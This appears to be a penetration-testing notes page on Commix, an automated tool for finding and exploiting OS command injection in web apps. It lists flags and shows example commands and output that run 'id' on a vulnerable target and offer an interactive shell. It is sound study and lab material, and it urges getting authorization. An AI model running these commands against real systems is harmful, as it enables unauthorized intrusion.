#### Official Documentation: [https://github.com/commixproject/commix](https://github.com/commixproject/commix)
#### Cheat Sheet: [[Kali Tools#Commix|Commix Commands]]
## Purpose
Commix (Command Injection Exploiter) is an automated tool to test and exploit command injection vulnerabilities in web applications.

## Scenarios
- CTF: Automatically test parameters that may be vulnerable to OS command injection and attempt exploitation to get a reverse shell or run commands.  
- Real world: Quickly verify suspected injection points, but always confirm and exploit manually for safety and precision.

## All needed info to run
- Target URL with injectable parameter (GET or POST).  
- Optional proxy support (`--proxy`) to route via Burp.  
- Common flags:
  - `-u <url>` → target URL  
  - `--data="<postdata>"` → POST data  
  - `--os-cmd=<cmd>` → run a single OS command  
  - `--dump` → attempt to dump file(s)  
  - `--technique=<tech>` → choose technique (e.g., classic, bash)  
  - `--proxy=http://127.0.0.1:8080` → route through proxy  
  - `--level`, `--risk` → adjust tests
- Network access to the target and permission to test.

## Example commands & outputs
```bash
# Basic test against a GET parameter
$ commix -u "http://192.168.56.101/vuln.php?cmd=test" --batch
# Output snippet:
# [INFO] Testing 'cmd' parameter...
# [VULNERABLE] The target is vulnerable to command injection (application/OS)
# [INFO] Type 'shell' to spawn interactive shell, 'quit' to exit.

# Run a single OS command
$ commix -u "http://example.com/vuln.php?cmd=test" --os-cmd="id"
# Output:
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Use proxy to inspect traffic
$ commix -u "http://example.com/vuln.php?cmd=test" --proxy=http://127.0.0.1:8080 --batch
```

!!! note "Commix Basics"
	- Commix automates exploitation — use `--batch` to skip prompts if you know what you want.
	- Always confirm findings manually; automated exploitation can be noisy or unsafe.
	- Use `--proxy` to route through Burp and inspect payloads.
	- Get authorization before testing public/third-party sites.


### [[Kali Tools#Commix|Commix Commands]]